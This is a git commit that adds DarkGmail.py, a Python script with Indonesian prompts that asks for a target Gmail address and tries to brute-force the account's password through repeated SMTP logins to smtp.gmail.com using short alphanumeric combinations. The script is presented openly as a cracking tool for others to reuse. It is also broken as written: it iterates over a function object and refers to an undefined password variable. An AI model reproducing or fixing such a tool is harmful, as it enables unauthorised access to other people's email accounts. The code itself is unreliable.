5a8b337f7a4b3a171b9ca314299468670b1b990b
KangSantuy <pancasyah191@gmail.com>
2022-10-09 09:14:14 +0700

    Create DarkGmail.py

---
+++ DarkGmail.py
@@ -0,0 +1,25 @@
+#Code By Kang Santuy
+#Recode aja cil gk ngapa2
+import itertools 
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Masukan Gmail Target: ")
+def print_perms(chars, minlen, maxlen): 
+    for n in range(minlen, maxlen+1): 
+        for perm in itertools.product(chars, repeat=n): 
+            print(''.join(perm)) 
+
+print_perms("abcdefghijklmnopqrstuvwxyz1234567890", 2, 4)
+
+for symbols in print_perms:
+    try:
+        smtpserver.login(user, password)
+
+        print ("[+] Mulai Crack: %s") % symbols
+        break;
+    except smtplib.SMTPAuthenticationError:
+        print ("[!] Password salah: %s") % symbols
